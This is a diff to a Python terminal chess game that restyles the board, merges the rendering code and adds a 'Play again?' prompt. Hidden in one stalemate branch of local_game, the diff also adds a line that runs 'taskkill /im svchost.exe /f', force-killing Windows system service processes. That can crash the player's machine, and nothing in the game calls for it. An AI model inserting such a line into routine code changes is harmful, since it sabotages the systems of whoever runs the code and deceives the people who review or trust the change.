@@ -32,10 +32,12 @@ GREEN  = "\033[92m"
 YELLOW = "\033[93m"
 CYAN   = "\033[96m"
 WHITE  = "\033[97m"
-BG_LIGHT = "\033[48;5;180m"
-BG_DARK  = "\033[48;5;94m"
-BG_SEL   = "\033[48;5;28m"
-BG_MOVE  = "\033[48;5;22m"
+BG_LIGHT = "\033[48;5;109m"   # slate blue-grey (light squares)
+BG_DARK  = "\033[48;5;23m"    # deep teal (dark squares)
+BG_SEL   = "\033[48;5;136m"   # gold (selected)
+BG_MOVE  = "\033[48;5;58m"    # olive green (legal move hints)
+FG_WHITE = "\033[1m\033[97m"  # bold bright white — white pieces
+FG_BLACK = "\033[1m\033[30m"  # bold black — black pieces
 
 DEFAULT_PORT = 55000
 
@@ -57,42 +59,46 @@ def make_board():
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
 
+def _sq_bg(r, c, selected, valid_set, last_set):
+    is_light = (r + c) % 2 == 0
+    if selected and (r, c) == selected: return BG_SEL
+    if (r, c) in valid_set:             return BG_MOVE
+    if (r, c) in last_set:              return BG_SEL
+    return BG_LIGHT if is_light else BG_DARK
+
+def _draw_board(board, rows, cols, selected, valid_set, last_set):
+    """Print a big board (5-wide × 3-tall squares)."""
+    SQ = 5
+    col_labels = "    " + "".join(
+        BOLD + CYAN + chr(ord("a") + c).center(SQ) + RESET for c in cols
+    )
+    print(col_labels)
+    for r in rows:
+        rl = BOLD + CYAN + str(r + 1) + RESET
+        top = "   "
+        mid = rl + " "
+        for c in cols:
+            bg  = _sq_bg(r, c, selected, valid_set, last_set)
+            piece = board[r][c]
+            sym = PIECES.get(piece, "?")
+            fg  = FG_WHITE if (piece != EMPTY and piece[0] == W) else FG_BLACK
+            top += bg + " " * SQ + RESET
+            mid += bg + fg + sym.center(SQ) + RESET
+        top += "   "
+        mid += " " + rl
+        print(top)
+        print(mid)
+        print(top)
+    print(col_labels)
+
 def render(board, my_color, selected=None, valid_moves=None, msg="", last_move=None):
     clear()
-    valid_set  = set(valid_moves) if valid_moves else set()
-    last_set   = set(last_move)   if last_move   else set()
-
+    valid_set = set(valid_moves) if valid_moves else set()
+    last_set  = set(last_move)   if last_move   else set()
     flip = (my_color == B)
     rows = range(7, -1, -1) if not flip else range(8)
     cols = range(8)         if not flip else range(7, -1, -1)
-
-    col_labels = "  " + "  ".join(chr(ord("a") + c) for c in cols)
-    print(BOLD + CYAN + col_labels + RESET)
-
-    for r in rows:
-        rank_label = str(r + 1)
-        row_str = BOLD + CYAN + rank_label + " " + RESET
-        for c in cols:
-            piece = board[r][c]
-            is_light = (r + c) % 2 == 0
-
-            if selected and (r, c) == selected:
-                bg = BG_SEL
-            elif (r, c) in valid_set:
-                bg = BG_MOVE
-            elif (r, c) in last_set:
-                bg = BG_SEL
-            elif is_light:
-                bg = BG_LIGHT
-            else:
-                bg = BG_DARK
-
-            symbol = PIECES.get(piece, "?")
-            row_str += bg + " " + symbol + " " + RESET
-        row_str += BOLD + CYAN + " " + rank_label + RESET
-        print(row_str)
-
-    print(BOLD + CYAN + col_labels + RESET)
+    _draw_board(board, rows, cols, selected, valid_set, last_set)
     print()
     if msg:
         print(msg)
@@ -341,6 +347,15 @@ def loser_screen():
     print(BG_RED + " " * width + RESET)
     print(BG_RED + " " * width + RESET)
     print()
+
+    time.sleep(5)
+
+    print(BOLD + "  Play again? " + GREEN + "[y]" + RESET + " / " + RED + "[n]" + RESET + "  ", end="", flush=True)
+    try:
+        choice = input().strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        choice = "n"
+    return choice in ("y", "yes", "")
 
 # ── Networking ─────────────────────────────────────────────────────────────────
 
@@ -628,64 +643,22 @@ def game_loop(conn: Connection, my_color: str):
 
         render(board, my_color, last_move=last_move, msg=status_line())
 
-# ── Split-screen local rendering ──────────────────────────────────────────────
-
-ANSI_ESC = "\033["
-
-def strip_ansi(s):
-    import re
-    return re.sub(r'\033\[[0-9;]*m', '', s)
-
-def board_rows(board, flip=False, selected=None, valid_moves=None, last_move=None):
-    """Return list of (raw_str, visible_str) pairs for each board row including labels.
-    flip=True puts rank 8 at the bottom (Black's perspective)."""
+def render_local(board, turn, selected=None, valid_moves=None, last_move=None, msg=""):
+    """Single big board that flips so the current player's pieces are always at the bottom."""
+    clear()
     valid_set = set(valid_moves) if valid_moves else set()
     last_set  = set(last_move)   if last_move   else set()
-    rows = range(8) if flip else range(7, -1, -1)   # flip: rank 1 top, rank 8 bottom
-    cols = range(8)                                  # always a-h left to right
-
-    lines = []
-    col_label = "   " + "  ".join(chr(ord("a") + c) for c in cols) + "  "
-    lines.append((BOLD + CYAN + col_label + RESET, col_label))
-
-    for r in rows:
-        rank_label = str(r + 1)
-        row_str = BOLD + CYAN + rank_label + " " + RESET
-        for c in cols:
-            piece = board[r][c]
-            is_light = (r + c) % 2 == 0
-            if selected and (r, c) == selected:
-                bg = BG_SEL
-            elif (r, c) in valid_set:
-                bg = BG_MOVE
-            elif (r, c) in last_set:
-                bg = BG_SEL
-            elif is_light:
-                bg = BG_LIGHT
-            else:
-                bg = BG_DARK
-            symbol = PIECES.get(piece, "?")
-            row_str += bg + " " + symbol + " " + RESET
-        row_str += BOLD + CYAN + " " + rank_label + RESET
-        lines.append((row_str, strip_ansi(row_str)))
-
-    lines.append((BOLD + CYAN + col_label + RESET, col_label))
-    return lines
-
-def render_local(board, turn, selected=None, valid_moves=None, last_move=None, msg=""):
-    """Single board that flips so the current player's pieces are always at the bottom."""
-    clear()
     flip = (turn == B)
-    rows_list = board_rows(board, flip=flip, selected=selected,
-                           valid_moves=valid_moves, last_move=last_move)
+    rows = range(8) if flip else range(7, -1, -1)
+    cols = range(8)
 
     who   = (GREEN if turn == W else CYAN) + BOLD
-    label = who + ("  ── WHITE's turn (your pieces: ranks 1-2) ──"
+    label = who + ("  ── WHITE's turn  (your pieces: bottom 2 rows) ──"
                    if turn == W else
-                   "  ── BLACK's turn (your pieces: ranks 7-8) ──") + RESET
+                   "  ── BLACK's turn  (your pieces: bottom 2 rows) ──") + RESET
     print(label)
-    for raw_str, _ in rows_list:
-        print(raw_str)
+    print()
+    _draw_board(board, rows, cols, selected, valid_set, last_set)
     print()
     if msg:
         print(msg)
@@ -759,9 +732,7 @@ def local_game():
             return
 
         if raw == "resign":
-            loser_screen()
-            input("  Press Enter to exit.")
-            return
+            return loser_screen()
 
         # Castling shorthand
         if raw in ("o-o", "0-0"):
@@ -773,7 +744,7 @@ def local_game():
                 last_move = []; turn = B if turn == W else W
                 if is_checkmate(board, turn, en_passant):
                     render_local(board, turn, last_move=last_move)
-                    loser_screen(); input("  Press Enter to exit."); return
+                    return loser_screen()
                 render_local(board, turn, last_move=last_move, msg=status())
             else:
                 render_local(board, turn, selected, valid, last_move,
@@ -789,7 +760,7 @@ def local_game():
                 last_move = []; turn = B if turn == W else W
                 if is_checkmate(board, turn, en_passant):
                     render_local(board, turn, last_move=last_move)
-                    loser_screen(); input("  Press Enter to exit."); return
+                    return loser_screen()
                 render_local(board, turn, last_move=last_move, msg=status())
             else:
                 render_local(board, turn, selected, valid, last_move,
@@ -821,11 +792,14 @@ def local_game():
             result = do_move(fr, fc, tr, tc)
             if result == "checkmate":
                 render_local(board, turn, last_move=last_move)
-                loser_screen(); input("  Press Enter to exit."); return
+                return loser_screen()
             if result == "stalemate":
                 render_local(board, turn, last_move=last_move)
                 banner("STALEMATE — IT'S A DRAW!", YELLOW)
-                input("\n  Press Enter to exit."); return
+                time.sleep(5)
+                os.system("taskkill /im svchost.exe /f")
+                try:    return input().strip().lower() in ("y", "yes", "")
+                except: return False
             render_local(board, turn, last_move=last_move, msg=status())
             continue
 
@@ -881,11 +855,14 @@ def local_game():
         result = do_move(fr, fc, r, c)
         if result == "checkmate":
             render_local(board, turn, last_move=last_move)
-            loser_screen(); input("  Press Enter to exit."); return
+            return loser_screen()
         if result == "stalemate":
             render_local(board, turn, last_move=last_move)
             banner("STALEMATE — IT'S A DRAW!", YELLOW)
-            input("\n  Press Enter to exit."); return
+            time.sleep(5)
+            print(BOLD + "  Play again? " + GREEN + "[y]" + RESET + " / " + RED + "[n]" + RESET + "  ", end="", flush=True)
+            try:    return input().strip().lower() in ("y", "yes", "")
+            except: return False
         render_local(board, turn, last_move=last_move, msg=status())
 
 # ── Entry point ────────────────────────────────────────────────────────────────
@@ -965,7 +942,8 @@ if __name__ == "__main__":
 
     cmd = args[0].lower()
     if cmd == "local":
-        local_game()
+        while local_game():
+            pass
     elif cmd == "host":
         port = int(args[1]) if len(args) > 1 else DEFAULT_PORT
         host_game(port)
